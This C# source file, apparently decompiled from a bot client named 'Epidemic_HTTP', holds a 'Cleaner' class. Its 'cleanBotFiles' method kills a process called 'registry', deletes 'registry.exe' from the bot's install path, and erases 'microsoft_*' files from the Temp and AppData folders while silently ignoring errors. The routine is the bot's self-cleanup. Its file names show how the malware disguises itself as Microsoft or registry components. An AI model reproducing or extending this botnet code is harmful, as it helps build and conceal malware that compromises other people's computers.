using System;
using System.IO;

namespace Epidemic_HTTP;

internal class Cleaner
{
	private static string dir;

	private static string fileType;

	public Cleaner(string c_dir, string c_fileType)
	{
		dir = c_dir;
		fileType = c_fileType;
	}

	public void cleanBotFiles()
	{
		try
		{
			Functions.FindAndKillProcess("registry");
			File.Delete(Config.bot_file_path + "registry.exe");
			DirectoryInfo directoryInfo = new DirectoryInfo(Path.GetTempPath());
			DirectoryInfo directoryInfo2 = new DirectoryInfo(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\");
			FileInfo[] files = directoryInfo.GetFiles("microsoft_*." + fileType);
			FileInfo[] files2 = directoryInfo2.GetFiles("microsoft_*." + fileType);
			FileInfo[] array = files;
			foreach (FileInfo fileInfo in array)
			{
				fileInfo.Delete();
			}
			array = files2;
			foreach (FileInfo fileInfo2 in array)
			{
				fileInfo2.Delete();
			}
		}
		catch
		{
		}
	}
}
